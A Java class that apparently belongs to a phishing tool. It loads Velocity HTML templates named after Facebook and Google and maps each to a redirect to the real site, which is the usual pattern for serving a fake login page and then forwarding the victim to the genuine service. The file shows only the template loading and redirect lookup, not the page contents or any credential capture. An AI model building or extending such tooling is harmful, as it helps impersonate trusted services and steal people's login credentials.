package org.guercifzone.Simple.BackClasses;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;

import java.io.*;
import java.util.*;

public class BackTemplates {
    private static final Map<String, BackTemplates.TemplateConfig> templates = new HashMap<>();
    private static final String TEMPLATES_DIR = "src/main/resources/templates/";

    static {
        // Initialize templates
        templates.put("facebook", new BackTemplates.TemplateConfig("facebook.html", "https://facebook.com"));
        templates.put("google", new BackTemplates.TemplateConfig("google.html", "https://google.com"));
        templates.put("default", new BackTemplates.TemplateConfig("default.html", "https://example.com"));

        // Initialize Velocity template engine
        Velocity.init();
    }

    public static String getTemplate(String templateName) {
        BackTemplates.TemplateConfig config = templates.getOrDefault(templateName, templates.get("default"));
        try {
            String templatePath = TEMPLATES_DIR + config.getFilename();
            String templateContent = readFile(templatePath);

            // Use Velocity to process template if needed
            VelocityContext context = new VelocityContext();
            // Add variables to context if needed
            StringWriter writer = new StringWriter();
            Velocity.evaluate(context, writer, "template", templateContent);

            return writer.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "Error loading template";
        }
    }

    public static String getRedirectUrl(String templateName) {
        BackTemplates.TemplateConfig config = templates.getOrDefault(templateName, templates.get("default"));
        return config.getRedirectUrl();
    }
    public static List<String> listTemplates() {
        return new ArrayList<>(templates.keySet());
    }
    /*public static void listTemplates() {
        System.out.println("Available templates:");
        templates.keySet().forEach(System.out::println);
    }*/

    private static String readFile(String path) throws IOException {
        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(path))) {
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
        }
        return content.toString();
    }

    private static class TemplateConfig {
        private final String filename;
        private final String redirectUrl;

        public TemplateConfig(String filename, String redirectUrl) {
            this.filename = filename;
            this.redirectUrl = redirectUrl;
        }

        public String getFilename() {
            return filename;
        }

        public String getRedirectUrl() {
            return redirectUrl;
        }
    }
}
